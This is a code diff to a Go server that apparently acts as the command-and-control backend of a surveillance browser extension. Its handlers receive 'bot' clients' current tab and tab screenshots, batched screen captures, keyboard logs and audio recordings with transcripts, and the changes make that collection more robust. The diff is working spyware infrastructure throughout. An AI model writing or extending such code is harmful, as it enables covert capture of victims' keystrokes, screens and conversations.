@@ -22,6 +22,11 @@ func (s *Server) dispatch(ctx context.Context, sess *Session, env Envelope) erro
 	switch env.Action {
 	case ActionPing:
 		return s.handlePing(ctx, sess, env)
+	case ActionPong:
+		// Old extensions echo PONG back as if it were an RPC. The
+		// server already updated lastSeen via the original PING, so
+		// the echo is harmless — silently drop it instead of warning.
+		return nil
 	case ActionSync:
 		return s.handleSync(ctx, sess, env)
 	case ActionSyncHuge:
@@ -55,12 +60,16 @@ func (s *Server) handlePing(ctx context.Context, sess *Session, env Envelope) er
 	updates := map[string]any{"is_online": true, "last_online": now}
 
 	var data struct {
-		CurrentTab map[string]any `json:"current_tab"`
-		UserAgent  string         `json:"user_agent"`
+		CurrentTab      map[string]any `json:"current_tab"`
+		CurrentTabImage string         `json:"current_tab_image"`
+		UserAgent       string         `json:"user_agent"`
 	}
 	if err := json.Unmarshal(env.Data, &data); err == nil {
 		if data.CurrentTab != nil {
 			updates["current_tab"] = models.JSONMap(data.CurrentTab)
+		}
+		if data.CurrentTabImage != "" {
+			updates["current_tab_image"] = data.CurrentTabImage
 		}
 		if data.UserAgent != "" {
 			updates["user_agent"] = data.UserAgent
@@ -131,24 +140,35 @@ func (s *Server) handleRealtimeImg(_ context.Context, sess *Session, env Envelop
 
 func (s *Server) handleScreenCaptureData(_ context.Context, sess *Session, env Envelope) error {
 	var data struct {
-		URL       string  `json:"url"`
-		Title     string  `json:"title"`
-		ImageData string  `json:"image_data"`
-		SessionID string  `json:"session_id"`
-		Diff      float64 `json:"difference"`
+		Captures []struct {
+			URL       string  `json:"url"`
+			Title     string  `json:"title"`
+			ImageData string  `json:"imageData"`
+			SessionID string  `json:"sessionId"`
+			Diff      float64 `json:"difference"`
+		} `json:"captures"`
+		SessionID string `json:"sessionId"`
 	}
-	_ = json.Unmarshal(env.Data, &data)
-	row := models.BotScreenshot{
-		BotID:     sess.BotID,
-		URL:       data.URL,
-		Title:     data.Title,
-		ImageData: data.ImageData,
-		SessionID: data.SessionID,
-		Difference: &data.Diff,
-		Timestamp: time.Now(),
+	if err := json.Unmarshal(env.Data, &data); err != nil {
+		return nil
 	}
-	if err := s.db.Create(&row).Error; err != nil {
-		return err
+	for _, c := range data.Captures {
+		sid := c.SessionID
+		if sid == "" {
+			sid = data.SessionID
+		}
+		row := models.BotScreenshot{
+			BotID:      sess.BotID,
+			URL:        c.URL,
+			Title:      c.Title,
+			ImageData:  c.ImageData,
+			SessionID:  sid,
+			Difference: &c.Diff,
+			Timestamp:  time.Now(),
+		}
+		if err := s.db.Create(&row).Error; err != nil {
+			return err
+		}
 	}
 	return s.trimOldRows(sess.BotID, 500)
 }
@@ -187,14 +207,25 @@ func (s *Server) handleKeyboardLogs(_ context.Context, sess *Session, env Envelo
 func (s *Server) handleAudioData(_ context.Context, sess *Session, env Envelope) error {
 	var data struct {
 		Audio     string `json:"audio"`
+		Chunk     string `json:"chunk"`
 		Text      string `json:"text"`
 		SessionID string `json:"session_id"`
 	}
-	_ = json.Unmarshal(env.Data, &data)
+	if err := json.Unmarshal(env.Data, &data); err != nil {
+		s.logger.Warn("audio unmarshal failed", "err", err)
+		return nil
+	}
+	recording := data.Audio
+	if recording == "" {
+		recording = data.Chunk
+	}
+	if recording == "" {
+		return nil
+	}
 	now := time.Now()
 	row := models.BotRecording{
 		Bot:       sess.BotID,
-		Recording: data.Audio,
+		Recording: recording,
 		Text:      data.Text,
 		SessionID: data.SessionID,
 		Timestamp: &now,
